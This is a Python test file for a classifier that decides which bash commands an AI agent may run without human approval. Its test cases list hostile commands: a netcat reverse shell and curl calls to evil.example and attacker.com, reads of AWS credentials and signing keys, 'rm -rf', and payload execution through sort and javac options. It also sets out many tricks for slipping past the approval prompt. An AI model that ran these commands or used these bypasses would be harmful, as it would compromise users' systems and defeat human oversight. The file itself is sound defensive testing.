"""Tests for trust-reads — bash command classification and approval flow."""

from __future__ import annotations

import asyncio
from unittest.mock import AsyncMock, MagicMock

import pytest
from aiohttp import web
from aiohttp.test_utils import TestClient, TestServer

from kiro_crew.dashboard.chat import _extract_bash_command
from kiro_crew.dashboard.state import (
    DashboardState,
    _ChatSlot,
    is_read_only_bash,
    unsafe_bash_reason,
)
from kiro_crew.history import ConversationLog

# ── Helpers ──


# Allowlisted prefixes whose arguments are INPUTS: paths to read, patterns to match,
# refs to describe. Nothing here has an argument form that writes or executes, so
# none needs a vetting rule in `state.py`.
#
# It lives HERE rather than in `state.py` because the classifier never reads it --
# it is test data, and keeping it in the production module made it documentation
# masquerading as surface. `state.py` carries a pointer to it beside
# `_READ_ONLY_BASH_PREFIXES`, where somebody adding an entry will see it.
#
# PROVENANCE, because the first draft was WRONG. It held 36 entries recorded as the
# status quo without individual verification, and review caught `file`:
# `file -C -m ./magic` compiles a magic file and writes `magic.mgc` (464 bytes,
# verified). Auditing the REST instead of just that entry found three more, all of
# the helper-execution class already closed for `git log/diff/show`:
#
#   git cat-file --textconv  -> ran a configured helper
#   git cat-file --filters   -> ran a configured smudge filter
#   git blame    --textconv  -> ran a configured helper
#
# `git blame --textconv` is the one to remember: `git blame --help` does not list it,
# so only execution found it. Eight other keyword hits were checked and are reads
# (`ls --ignore-backups`, `du --separate-dirs`, `df --output=FIELD_LIST`,
# `diff --to-file=FILE`).
#
# What remains is 21 tools and 7 brazil prefixes whose `--help` shows no write- or
# exec-capable option. That is a SCAN, NOT A PROOF -- `git blame` is the standing
# evidence a scan can miss an accepted option -- which is why this is the weakest of
# the four argument stories, and why anything with a plausible write flag belongs in
# an accept-list instead.
_OPERANDS_ARE_INPUTS: frozenset[str] = frozenset(
    (
        "ls",
        "cat",
        "head",
        "tail",
        "grep",
        "egrep",
        "fgrep",
        "wc",
        "which",
        "stat",
        "du",
        "df",
        "diff",
        "pwd",
        "echo",
        "whoami",
        "uname",
        "readlink",
        "realpath",
        "basename",
        "dirname",
        "brazil ws show",
        "brazil ws list",
        "brazil workspace show",
        "brazil workspace list",
        "brazil versionset print",
        "brazil versionset show",
        "brazil-path",
    )
)


def _make_state(tmp_path):
    sessions = MagicMock(count=0)
    sessions.get_pid = MagicMock(return_value=None)
    sessions.remove = AsyncMock()
    return DashboardState(
        sessions=sessions,
        crons=MagicMock(list_jobs=MagicMock(return_value=[]), status=MagicMock(return_value={})),
        lessons=MagicMock(load_all=MagicMock(return_value=[])),
        start_time=0.0,
        conversation_log=ConversationLog(base_dir=tmp_path),
    )


def _make_app(state: DashboardState) -> web.Application:
    from kiro_crew.dashboard.chat import api_chat_mode, api_chat_slot_approve

    @web.middleware
    async def _test_auth(request: web.Request, handler):
        if "app" not in request:
            request["app"] = ""
        if "user" not in request:
            request["user"] = "local-app"
        return await handler(request)

    app = web.Application(middlewares=[_test_auth])
    app["state"] = state
    app.router.add_post("/api/chat/slots/{slot}/approve", api_chat_slot_approve)
    app.router.add_post("/api/chat/mode", api_chat_mode)
    return app


# ── is_read_only_bash classification ──


class TestIsReadOnlyBash:
    """Verify bash command classification — deny-by-default."""

    def test_simple_read_commands(self):
        assert is_read_only_bash("ls -la") is True
        assert is_read_only_bash("cat /tmp/foo.txt") is True
        assert is_read_only_bash("head -20 file.py") is True
        assert is_read_only_bash("tail -f log.txt") is True
        assert is_read_only_bash("grep -r 'pattern' src/") is True
        assert is_read_only_bash("wc -l file.txt") is True

    def test_find_not_auto_approved(self):
        # `find` is NOT on the read-only allowlist (SEC-005 / SEC-FC0A8D32):
        # it resolves destructive behaviour through sub-options (-delete/-exec),
        # so removing it from the allowlist (the finding's remediation option 1)
        # means it is never auto-approved.
        assert is_read_only_bash("find . -delete") is False
        assert is_read_only_bash("find . '-delete'") is False
        assert is_read_only_bash("find . -exec rm {} +") is False
        assert is_read_only_bash("find . -name '*.py'") is False
        assert is_read_only_bash("find src -type f") is False
        assert "not on the read-only allowlist" in unsafe_bash_reason("find . -delete")
        assert is_read_only_bash("diff file1 file2") is True

    def test_git_read_commands(self):
        assert is_read_only_bash("git status") is True
        assert is_read_only_bash("git log --oneline -5") is True
        assert is_read_only_bash("git diff HEAD") is True
        assert is_read_only_bash("git show abc123") is True
        assert is_read_only_bash("git branch -a") is True
        assert is_read_only_bash("git blame file.py") is True

    def test_brazil_read_commands(self):
        assert is_read_only_bash("brazil ws show") is True
        assert is_read_only_bash("brazil versionset print --vs live") is True
        assert is_read_only_bash("brazil workspace list") is True

    def test_help_and_version(self):
        # Version probes on the read-only prefix allowlist
        assert is_read_only_bash("python --version") is True
        assert is_read_only_bash("python3 --version") is True
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("node --version") is True
        # Bare help probes for non-executor programs pass the probe shape check
        assert is_read_only_bash("brazil-build --help") is True
        assert is_read_only_bash("some-tool --help") is True
        # Known code executors are denied even in bare --help form, because the
        # flag can land as an operand the interpreter runs
        assert is_read_only_bash("node --help") is False
        assert is_read_only_bash("npm --help") is False
        # Extra arguments after --help are not a probe shape
        assert is_read_only_bash("node --help --require /tmp/payload.js") is False
        assert is_read_only_bash("brazil-build --help --eval 'malicious'") is False
        assert is_read_only_bash("java --help -jar /tmp/evil.jar") is False
        assert is_read_only_bash("javac --help -processor evil") is False

    def test_version_probe_prefix_rejects_a_trailing_operand(self):
        """An allowlisted version probe is the exact command, not a head.

        `javac -version` is an explicit `_READ_ONLY_BASH_PREFIXES` entry and the
        match is `first == p or first.startswith(p + " ")`, so before this the
        entry vouched for the probe plus any trailing arguments. javac does not
        act on `-version` and exit: it prints the version and then compiles what
        it was given, and `-processorpath` runs an annotation processor -- caller
        supplied compiled Java -- during that compile.
        """
        # Compiles. Verified out of band: `javac -version T.java -d out`
        # produces out/T.class.
        assert is_read_only_bash("javac -version T.java -d out") is False
        # Arbitrary code execution at compile time via the processor path.
        assert (
            is_read_only_bash(
                "javac -version -processorpath p -processor Evil -d out src/Target.java"
            )
            is False
        )
        # The rule covers every probe entry, not just the one that acts today:
        # whether an interpreter ignores a trailing operand is a property of the
        # installed release, and JDK single-file source mode already changed that
        # answer once.
        assert is_read_only_bash("java -version -jar /tmp/evil.jar") is False
        assert is_read_only_bash("python3 --version -c 'print(1)'") is False
        assert is_read_only_bash("node --version /tmp/payload.js") is False
        assert "version probe only" in unsafe_bash_reason("javac -version T.java")
        # The probes themselves keep working -- nothing here is newly blocked.
        for probe in (
            "javac -version",
            "java -version",
            "python --version",
            "python3 --version",
            "node --version",
        ):
            assert is_read_only_bash(probe) is True, probe

    def test_git_read_prefix_rejects_output_path_flag(self):
        """`--output=<path>` turns an allowlisted git read into a file write.

        No shell `>` is involved, so `_UNSAFE_SHELL_RE` never sees it. Verified
        out of band against git: `log`, `diff` and `show` honour `--output` and
        write the named file; the other ten git entries ignore it.
        """
        for cmd in (
            "git diff --output=/tmp/pwned.txt",
            "git diff --output /tmp/pwned.txt",
            "git diff --output=/tmp/pwned.txt HEAD~1",
            "git log --output=/tmp/pwned.txt",
            "git show --output=/tmp/pwned.txt",
        ):
            assert is_read_only_bash(cmd) is False, cmd
            assert "writes to an arbitrary path" in unsafe_bash_reason(cmd), cmd
        # Ordinary operands and diff options are how these are normally used, so
        # they must stay read-only.
        for cmd in (
            "git diff",
            "git diff HEAD",
            "git diff --stat",
            "git diff --name-only HEAD~2",
            "git log --oneline -5",
            "git show abc123",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # `git diff -- --output` names a PATHSPEC, not a sink -- and it now prompts
        # anyway. `--` cannot be trusted to be the separator, because a value-taking
        # option consumes the next word whatever it looks like; see
        # `test_consumed_option_values_are_not_a_bypass`. The write-flag scan
        # therefore reads every token, which costs a prompt on a file spelled like a
        # flag. Asserted so the cost is recorded rather than discovered.
        assert is_read_only_bash("git diff -- --output") is False
        # The ordinary pathspec form is unaffected -- only a pathspec that is spelled
        # like a write flag pays.
        assert is_read_only_bash("git log --oneline -- src/") is True
        assert is_read_only_bash("git diff -- src/kiro_crew") is True

    def test_write_flag_check_survives_shell_quoting(self):
        """Argument vetting must read argv, not whitespace-split text.

        The classifier sees the command BEFORE the shell touches it, so a
        `.split()` token still carries its quotes and matches no flag, while bash
        strips them and git writes the file. Every quoting form of the same write
        has to be refused.
        """
        for cmd in (
            "git diff '--output=/tmp/pwned'",
            'git diff "--output=/tmp/pwned"',
            "git diff '--output' /tmp/pwned",
            "git log '--output=/tmp/pwned'",
            "git show '--output=/tmp/pwned'",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # Argv that cannot be established is not vouched for, rather than passed.
        assert is_read_only_bash("git diff '--output=/tmp/x") is False
        assert "cannot be parsed" in unsafe_bash_reason("git diff '--output=/tmp/x")

    def test_version_probe_keeps_a_discard_redirect(self):
        """A discard-only redirect is not a trailing operand.

        `java -version 2>&1` is the canonical probe because java prints its
        version to stderr. `_DEVNULL_REDIR_RE` already scrubs these sinks for the
        unsafe-shell check, so the argument vetting must scrub them too or it
        newly rejects the ordinary form of every probe on the allowlist.
        """
        for cmd in (
            "java -version 2>&1",
            "javac -version 2>&1",
            "python3 --version 2>/dev/null",
            "python --version 2>&1",
            "node --version 2>/dev/null",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # The operand form is still refused when a redirect rides along with it.
        assert is_read_only_bash("javac -version T.java 2>&1") is False

    def test_pipe_target_rejects_write_capable_arguments(self):
        """`_READ_ONLY_PIPE_RE` vouches for a filter head, not its arguments.

        Same root cause as the head path. Verified against the eleven filters it
        allowlists: `sort` and `uniq` are the only two that can write, by two
        different mechanisms (a flag, and a second operand).
        """
        for cmd in (
            "git log | sort -o /tmp/pwned",
            "git log | sort --output=/tmp/pwned",
            "git log | sort '-o' /tmp/pwned",
            "cat /tmp/x | uniq /tmp/in /tmp/pwned",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # `less` is no longer on the pipe allowlist at all, so it is refused at the
        # head and never reaches an argument check. `sort` moved to an accept-list
        # and reports "not a recognised read-only option"; its own test covers that.
        assert "not a read-only filter" in unsafe_bash_reason("cat /tmp/x | less -o /tmp/pwned")
        assert "second operand" in unsafe_bash_reason("cat /tmp/x | uniq a b")
        # The ordinary filter forms must stay read-only. `uniq -f 1 file` consumes
        # `1` as the flag's value, so it has ONE operand and only reads.
        for cmd in (
            "git log | sort",
            "git log | sort -u",
            "du -a | sort -rn | head -20",
            "git log | sort | uniq -c",
            "cat /tmp/x | uniq -f 1 /tmp/in",
            "grep -r foo src/ | head -20",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_attached_short_option_value_is_not_a_bypass(self):
        """A short option may carry its value with no separator.

        `sort -o/tmp/x` is the same write as `sort -o /tmp/x`, but it equals
        neither `-o` nor `-o=...`, so an equality-plus-`=` test lets it through.
        """
        for cmd in (
            "git log | sort -o/tmp/pwned",
            "tree -o/tmp/pwned",
        ):
            assert is_read_only_bash(cmd) is False, cmd

    def test_bundled_short_option_cluster_is_not_a_bypass(self):
        """A short option bundled behind another still reaches the same write.

        Measured against GNU sort, each of these writes the named file:
        `sort -o OUT`, `sort -oOUT`, `sort -uo OUT`, `sort -uoOUT`. A prefix test
        reads `-uo` as some option starting `-u` and misses it, so the test has to
        be membership in the option cluster.
        """
        for cmd in (
            "git log | sort -uo /tmp/pwned",
            "git log | sort -uo/tmp/pwned",
            "git log | sort -ro /tmp/pwned",
            "git log | sort -rno /tmp/pwned",
            "tree -ao /tmp/pwned",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # Clusters WITHOUT the write letter stay read-only, so ordinary use of
        # these filters is unaffected.
        for cmd in (
            "git log | sort -u",
            "du -a | sort -rn | head -20",
            "cat f | sort -k2n",
            "cat f | sort -t, -k1",
            # `tree -adL 2 src` used to be here. `tree` is off the allowlist
            # entirely now -- see `test_unverifiable_tool_is_off_the_allowlist`.
            "ls -lo",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_operands_after_double_dash_still_count(self):
        """`--` ends the OPTION list, not the operand list.

        After `--`, `-OUT` is a filename however it is spelled, so a
        leading-dash test alone reads it as a flag and misses the write.
        """
        assert is_read_only_bash("cat /tmp/x | uniq -- /tmp/in -/tmp/pwned") is False
        assert is_read_only_bash("cat /tmp/x | uniq -- IN OUT") is False
        assert is_read_only_bash("git branch -- -newbranch") is False

    def test_ref_creating_git_reads_reject_a_bare_operand(self):
        """`git branch NAME` / `git tag NAME` mutate via an OPERAND, not a flag.

        Verified: `git branch injected` adds a branch and `git tag t` adds a tag.
        Stated positively, an operand is a filter pattern only alongside a
        list-mode flag; git itself refuses the ambiguous `git branch -a <name>`.
        """
        assert is_read_only_bash("git branch injected") is False
        assert is_read_only_bash("git tag injected-tag") is False
        assert "creates a ref" in unsafe_bash_reason("git branch injected")
        for cmd in (
            "git branch",
            "git branch -a",
            "git tag",
            "git branch --list feat-x",
            "git tag -l v1",
            "git branch --contains HEAD",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        # The GLOBBED list patterns are refused, but for an unrelated reason -- the
        # shell rewrites them before git parses them, so the operand this rule
        # inspects is not the one git receives. See
        # `test_globbed_option_token_is_not_a_bypass`.
        for cmd in ("git branch --list 'feat/*'", "git tag -l 'v*'"):
            assert is_read_only_bash(cmd) is False, cmd
            assert "shell expands" in unsafe_bash_reason(cmd)

    def test_write_flag_tables_do_not_catch_same_named_read_flags(self):
        """The tables are keyed per tool because `-o` is not one thing.

        `ls -o` is a long format, `uname -o` prints the OS, `df --output=FIELDS`
        and `cut --output-delimiter=STR` shape output, `grep -o` is
        only-matching. None of them writes, and a global flag denylist would
        newly reject every one.
        """
        for cmd in (
            "ls -o",
            "uname -o",
            "df --output=size",
            "grep -o foo file | head",
            "cat f | cut --output-delimiter=, -f1,2",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_shell_expanded_arguments_are_not_vouched_for(self):
        """The token this classifier holds is not what the tool receives.

        `shlex` models quoting but not expansion, so a single token can become
        several words. Measured: `bash -c 'uniq {input,pwned}'` writes `pwned`
        while `shlex.split` reports ONE operand, which defeats an operand count
        outright. Fail closed instead.
        """
        for cmd in (
            "cat input | uniq {input,/tmp/pwned}",
            "cat input | uniq input*",
            "cat input | uniq $A $B",
            "cat input | sort ${V}",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # A leading `~` is a tilde expansion; `HEAD~1` is not, and must survive.
        assert is_read_only_bash("git diff HEAD~1") is True
        # A glob is disqualifying on a vetted prefix even inside what LOOKS like a
        # pattern argument. These two read-only forms used to be asserted True on
        # the reasoning that a glob only matters where the operand COUNT decides the
        # verdict; `git diff --out*` disproved that by expanding into an OPTION. The
        # quoted spelling is genuinely safe, but `shlex.split` returns the identical
        # token list for `--list 'feat/*'` and `--list feat/*`, so the classifier
        # cannot tell them apart and has to fail closed on both.
        assert is_read_only_bash("git branch --list 'feat/*'") is False
        assert is_read_only_bash("git tag -l 'v*'") is False
        # The cost is bounded to the vetted prefixes: nothing else consults
        # `_shell_rewrites`, so ordinary globbing is untouched.
        for cmd in ("ls *.py", "grep foo *.py", "cat *.txt | head -5"):
            assert is_read_only_bash(cmd) is True, cmd

    def test_abbreviated_long_options_are_not_a_bypass(self):
        """getopt_long accepts any UNIQUE PREFIX of a long option.

        Measured on GNU sort, every one of `--output`, `--outpu`, `--outp`,
        `--out`, `--ou` and `--o` wrote the named file, so matching the full
        spelling can never be enough. Refusing the prefixes covers the whole
        abbreviation class by construction.
        """
        for cmd in (
            "cat input | sort --output=/tmp/pwned",
            "cat input | sort --outp=/tmp/pwned",
            "cat input | sort --o=/tmp/pwned",
            "cat input | sort --ou /tmp/pwned",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # A token that is NOT a prefix of the write flag is untouched, so the rule
        # cannot over-reach onto a same-initial read option. `less -SN` used to be
        # the example here; it is now refused for a different and stronger reason
        # (the pager is off the allowlist), so `sort` carries the case alone.
        assert is_read_only_bash("cat f | sort -k2n") is True
        assert is_read_only_bash("cat f | sort -t, -k1") is True

    def test_ref_mutating_modes_without_an_operand_are_rejected(self):
        """Some `git branch` modes mutate with no operand at all.

        Verified: `git branch --unset-upstream` on a tracking branch leaves
        `git rev-parse @{u}` reporting "no upstream configured". An operand rule
        alone never sees these, so the mutating modes are named directly. Exact
        spellings suffice because git does not accept abbreviated long options
        (measured: `git diff --outp=F` exits 129).
        """
        for cmd in (
            "git branch --unset-upstream",
            "git branch --edit-description",
            "git branch --set-upstream-to=main",
            "git branch -d somebranch",
            "git branch -m old new",
            "git tag -d v1",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "mutating mode" in unsafe_bash_reason("git branch --unset-upstream")
        # git's parse-options takes a short option's value ATTACHED, so these are
        # the same mutations as the spaced forms. Measured: `git branch -uother`
        # printed "branch 'main' set up to track 'other'". An exact-token test
        # matched none of them, which is why this goes through `_flag_hit`.
        for cmd in (
            "git branch -uorigin/main",
            "git branch -dsomebranch",
            "git branch -Dsomebranch",
            "git branch -mold",
            "git branch -corigin",
            "git branch -fname",
            "git tag -dv1",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # Cluster membership is safe for these two commands because no READ-only
        # short option of theirs takes a value, so no value character can be read
        # as a mutator letter.
        for cmd in (
            "git branch -a",
            "git branch -r",
            "git branch -v",
            "git branch -vv",
            "git branch -av",
            "git branch --merged main",
        ):
            assert is_read_only_bash(cmd) is True, cmd
        for cmd in ("git branch", "git branch -a", "git tag", "git branch --contains HEAD"):
            assert is_read_only_bash(cmd) is True, cmd

    def test_subcommand_mutating_git_reads_are_rejected(self):
        """`git remote` mutates through its SUBCOMMAND operand.

        Same cause as `git branch NAME`. Verified: `git remote add injected <url>`
        took the remote list from empty to `injected`, and `git remote prune` drops
        remote-tracking refs. Stated positively, because `show` and `get-url` are
        reads that legitimately take an operand.
        """
        for cmd in (
            "git remote add injected https://example.com/x.git",
            "git remote remove origin",
            "git remote rename a b",
            "git remote prune origin",
            "git remote set-url origin https://example.com/y.git",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "read subcommands" in unsafe_bash_reason("git remote add x y")
        for cmd in (
            "git remote",
            "git remote -v",
            "git remote show origin",
            "git remote get-url origin",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_date_and_hostname_are_vetted_positively(self):
        """Both moved from a write-flag deny-list to an accept-list.

        The deny-list leaked on each of them, which is why. `date` carried only
        `--set`, so the SHORT `-s` and the legacy `date MMDDhhmm` operand both set
        the clock unchallenged; `hostname` had only an operand rule, so `-b` and
        `--file=F` set the name with no operand to catch. All four verified: each
        fails ONLY on privilege ("Operation not permitted"), so the classifier was
        the sole thing standing in front of them.

        The accept-list also dissolves the dilemma that kept `-s` out before. The
        old cluster test could not tell an option letter from a character inside an
        attached value, and `date -Iseconds` is a read whose VALUE contains `s`.
        Declaring `-I` value-taking consumes `seconds` as a value, so it is never
        scanned for option letters and `-s` can be refused without collateral.
        """
        for cmd in (
            "date -s 'next hour'",  # short setter -- was reachable
            "date --set=2020-01-01",
            "date --set 2020-01-01",
            "date --se=x",  # accept-list needs an EXACT long flag
            "date --s=x",
            "date 08221200",  # legacy operand form -- was reachable
            "date -u 08221200",
            "hostname newname",
            "hostname -b x",  # option-only setter -- was reachable
            "hostname -F /tmp/name",
            "hostname --file=/tmp/name",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "not a recognised read-only option" in unsafe_bash_reason("date -s now")
        assert "sets the system clock" in unsafe_bash_reason("date 08221200")
        assert "sets the hostname" in unsafe_bash_reason("hostname newname")
        # Every ordinary read stays approved, including the `+FORMAT` operand, which
        # is the one operand shape `date` only prints.
        for cmd in (
            "date",
            "date +%Y-%m-%d",
            "date -Iseconds",
            "date -I",
            "date --iso-8601=seconds",
            "date -u",
            "date --utc",
            "date -u +%s",
            # `date -d` is deliberately NOT here: it reads under GNU but SETS the
            # kernel DST value under BSD/macOS. See
            # `test_platform_divergent_letters_are_not_read_only`. The long form is
            # unaffected and covers the same use case.
            "date --date=yesterday",
            "date --date yesterday",
            "date -r /tmp",
            "date -R",
            "date --rfc-3339=seconds",
            "hostname",
            "hostname -f",
            "hostname -s",
            "hostname -d",
            "hostname -i",
            "hostname -I",
            "hostname -A",
            "hostname --fqdn",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_git_external_helper_flags_are_rejected(self):
        """`--ext-diff` / `--textconv` run a configured helper: code, not a read.

        Measured with `diff.external` pointed at a marker-touching script:
        `git log -p --ext-diff`, `git show --ext-diff` and `git diff --ext-diff`
        each ran it, and the same held for `--textconv` against a configured
        `diff.<name>.textconv`.

        KNOWN INCOMPLETE for `git diff`, which honours a configured driver with NO
        flag at all -- there is no argument to refuse, so this closes `git log` and
        `git show` (where the flag is required) and cannot close `git diff`. What
        bounds it: the capability is CONFIG-sourced, never repo-content sourced. A
        committed `.gitattributes` saying `* diff=evil` executes nothing on its own,
        because the `diff.evil.command` mapping must exist in config and a clone
        does not carry config (verified).
        """
        for cmd in (
            "git log -p --ext-diff",
            "git show --ext-diff",
            "git diff --ext-diff",
            "git log -p --textconv",
            "git show --textconv",
            "git diff --textconv",
        ):
            assert is_read_only_bash(cmd) is False, cmd
            assert "external helper" in unsafe_bash_reason(cmd), cmd
        # The negations and the ordinary reads are untouched.
        for cmd in (
            "git diff --no-ext-diff",
            "git diff --no-textconv",
            "git log -p",
            "git show abc123",
            "git diff HEAD",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_argument_case_survives_classification(self):
        """Arguments are vetted in their ORIGINAL case, not folded.

        `_classify_bash` lower-cases the head to recognise the command NAME, and
        that folded string used to be what got vetted too -- while the pipe path
        never folded, so `sort`'s accept-list saw true case and the head path's did
        not.

        This is a GUARD, not the fix for a previously exploitable hole: it was
        latent. Every head-path flag that existed before was already lower-case
        (`--output`, `-o`, `--set`), so nothing consulted the folded string in a
        case-significant way and this test passes on the pre-accept-list code. It
        bites the moment an accept-list lives on the head path, which is now:
        `hostname -F file` SETS the name while `-f` prints the FQDN, and
        `date -Iseconds` is a read whose option letter is uppercase, so folding
        turns the first into a read and the second into an unknown `-i`.
        """
        # Uppercase setter must not fold onto its lowercase read twin.
        assert is_read_only_bash("hostname -F /tmp/name") is False
        assert is_read_only_bash("hostname -f") is True
        # Uppercase read must not fold onto an unlisted lowercase letter.
        assert is_read_only_bash("date -Iseconds") is True
        assert is_read_only_bash("date -I") is True
        # Case-significant read flags survive on the pipe side too.
        assert is_read_only_bash("cat f | sort -M") is True
        assert is_read_only_bash("cat f | sort -V") is True

    def test_sort_options_are_vetted_positively(self):
        """`sort` is vetted by an accept-list, not a deny-list.

        The deny-list did not converge on this tool: five review rounds produced
        six spellings of the same escape, the last being `--compress-program`,
        which is arbitrary CODE EXECUTION rather than a write. Verified out of
        band, with the input large enough to spill to temporaries,
        `sort -S 1k --compress-program=./payload big.txt` ran the payload at exit 0.
        """
        assert is_read_only_bash("cat f | sort --compress-program=./payload") is False
        # A long flag must match exactly, so every abbreviation of it is refused too.
        assert is_read_only_bash("cat f | sort --compress-prog=./payload") is False
        # Writes temporaries into a caller-named directory.
        for cmd in (
            "cat f | sort -T /tmp/evil",
            "cat f | sort -T/tmp/evil",
            "cat f | sort --temporary-directory=/tmp/evil",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        # Opens a caller-named path; not on the accept-list, so it prompts.
        assert is_read_only_bash("cat f | sort --random-source=/etc/shadow") is False
        assert is_read_only_bash("cat f | sort --files0-from=/etc/passwd") is False
        # Every earlier round's spelling stays closed by this one rule.
        for cmd in (
            "git log | sort -o /tmp/pwned",
            "git log | sort -o/tmp/pwned",
            "git log | sort --output=/tmp/pwned",
            "git log | sort -uo /tmp/pwned",
            "cat f | sort --o=/tmp/pwned",
            "cat f | sort -rTo /tmp/x",
        ):
            assert is_read_only_bash(cmd) is False, cmd
        assert "read-only option" in unsafe_bash_reason("cat f | sort -T /tmp/x")

    def test_sort_read_only_options_still_pass(self):
        """The accept-list must not cost ordinary use.

        A value-taking short option consumes the rest of its token, so `-k2n` and
        `-S1k` are one flag plus a value rather than a letter cluster in which `2`
        and `1` look like unknown options. `-to` is the field separator `o`, which
        is exactly what the earlier cluster-membership rule over-blocked.
        """
        for cmd in (
            "git log | sort",
            "git log | sort -u",
            "du -a | sort -rn | head -20",
            "cat f | sort -k2n",
            "cat f | sort -k 2 -n",
            "cat f | sort -t, -k1",
            "cat f | sort -to",
            "cat f | sort -S1k",
            "cat f | sort -S 1k",
            "cat f | sort -bdfi",
            "cat f | sort -c",
            "cat f | sort -m f2",
            "cat f | sort -z",
            "cat f | sort other.txt",
            "cat f | sort -k1,2 -t: -S 2M -u",
            "cat f | sort --reverse",
            "cat f | sort --key=2",
            "cat f | sort --parallel=4",
        ):
            assert is_read_only_bash(cmd) is True, cmd

    def test_interpreter_suffix_bypass_rejected(self):
        """Regression: trailing --help/--version must NOT auto-approve
        interpreter commands whose head is not on the read-only allowlist.
        See: coordinated disclosure from Robert Noack, 2026-08-15."""
        # bash -c '<payload>' --help — interpreter passes flag to script
        assert is_read_only_bash("bash -c 'touch /tmp/owned' --help") is False
        assert is_read_only_bash("bash -c 'whoami' --version") is False
        # python3 -c '<payload>' --help
        payload = "python3 -c \"open('/tmp/p1','w').write('x')\" --help"
        assert is_read_only_bash(payload) is False
        # sh -c variant
        assert is_read_only_bash("sh -c 'curl attacker.com' --help") is False
        # ruby/perl -e variants
        assert is_read_only_bash("ruby -e 'system(\"id\")' --help") is False
        assert is_read_only_bash("perl -e 'exec(\"id\")' --help") is False

    def test_help_probe_allows_one_bare_subcommand(self):
        """`<program> <subcommand> --help` is still a usage probe."""
        assert is_read_only_bash("git log --help") is True
        assert is_read_only_bash("git rev-parse --help") is True
        assert is_read_only_bash("terraform plan --help") is True
        assert is_read_only_bash("cargo --version") is True

    def test_help_suffix_does_not_auto_approve_an_arbitrary_command(self):
        """A trailing `--help` must not vouch for the command in front of it.

        The classifier used to accept any segment whose first pipe element
        ended with `--help`/`--version`, so appending the token removed the
        human approval prompt for arbitrary commands. A shell hands `--help`
        to the script as $1 instead of printing usage, so the payload still
        ran.
        """
        # Interpreters: the operand is code, and it executes.
        assert is_read_only_bash("sh /tmp/payload.sh --help") is False
        assert is_read_only_bash("bash /tmp/payload.sh --version") is False
        assert is_read_only_bash("/bin/sh /tmp/x.sh --help") is False
        assert is_read_only_bash("./sh evil.sh --help") is False
        assert is_read_only_bash("python -c \"import os;os.system('id')\" --help") is False
        # Destructive operands.
        assert is_read_only_bash("rm -rf ./proj --help") is False
        assert is_read_only_bash("chmod 777 /etc/passwd --help") is False
        # Wrappers that hand off to another program.
        assert is_read_only_bash("sudo rm -rf / --help") is False
        assert is_read_only_bash("env sh evil.sh --help") is False
        assert is_read_only_bash("xargs rm --help") is False
        assert is_read_only_bash("docker run --rm alpine --help") is False
        # Network tools: the operand opens a connection.
        assert is_read_only_bash("nc evil.example 4444 -e /bin/sh --help") is False
        assert is_read_only_bash("curl http://evil.example/x.sh --help") is False

    def test_help_suffix_does_not_auto_approve_across_segments(self):
        """Every `&&`/`;` segment is classified, so the suffix cannot chain.

        These are the payloads that combined the suffix with a sensitive-path
        read or a write to the deny-rule keystone file.
        """
        assert is_read_only_bash("cd ~/.kiro/crew --help && cat token_signing.key --help") is False
        assert (
            is_read_only_bash("cd ~/.kiro/crew --help && tee denied_commands.json --help") is False
        )
        assert is_read_only_bash("V=$HOME --help; awk 1 $V/.aws/credentials --help") is False

    def test_help_probe_rejects_verbose_flags(self):
        """`-v`/`-V` mean verbose far more often than version.

        `rm victim -v` is three tokens ending in a flag with a bare word in the
        middle, so a probe check keyed on shape alone reads it as
        ``<program> <subcommand> <flag>`` — and GNU rm deletes the operand.
        """
        assert is_read_only_bash("rm victim -v") is False
        assert is_read_only_bash("rm victim -V") is False
        assert is_read_only_bash("rm -rf dir -v") is False
        assert is_read_only_bash("chmod 777 file -v") is False
        assert is_read_only_bash("mv a b -v") is False
        assert is_read_only_bash("cp secret /tmp -v") is False
        # The two explicit allowlist entries still work — they are matched as
        # prefixes, not as probes.
        assert is_read_only_bash("java -version") is True
        assert is_read_only_bash("python --version") is True

    def test_help_probe_rejects_shell_builtins_that_run_their_operand(self):
        """`source payload --help` executes `payload` in the current shell.

        These are builtins, not programs on PATH, so the PATH-name requirement
        does not reach them on its own — `source` and `.` read the operand from
        the workspace and run it, with `--help` landing as $1.
        """
        assert is_read_only_bash("source payload --help") is False
        assert is_read_only_bash(". payload --help") is False
        assert is_read_only_bash("exec payload --help") is False
        assert is_read_only_bash("eval payload --help") is False
        assert is_read_only_bash("command payload --help") is False
        assert is_read_only_bash("builtin cd --help") is False
        assert is_read_only_bash("trap payload --help") is False

    def test_help_probe_rejects_a_shell_expanded_program(self):
        """The program must BE a bare command name, not merely lack a separator.

        `$SHELL payload --help` names a shell that then RUNS `payload`, and the
        old rule — "does the token contain a path separator?" — said yes to it.
        A rejection list cannot close this: the spellings the shell resolves at
        run time are unbounded, so the requirement is stated positively instead.
        """
        assert is_read_only_bash("$SHELL payload --help") is False
        assert is_read_only_bash("${SHELL} payload --help") is False
        assert is_read_only_bash("$0 payload --help") is False
        assert is_read_only_bash("$SHELL --help") is False
        assert is_read_only_bash("$(which sh) payload --help") is False
        assert is_read_only_bash("`which sh` payload --help") is False
        assert is_read_only_bash("$HOME/evil --help") is False
        assert is_read_only_bash("~/evil --help") is False

    def test_help_probe_rejects_a_script_running_package_manager(self):
        """`yarn clean --help` runs the project's `clean` script, then passes the flag.

        The three-token form reads as `<program> <subcommand> --help`, but for
        these the "subcommand" is a name from the project's own manifest — in this
        repo `clean` deletes `dist` and `node_modules`. Nothing here can tell a
        real subcommand from a script name, so the program is refused outright.
        """
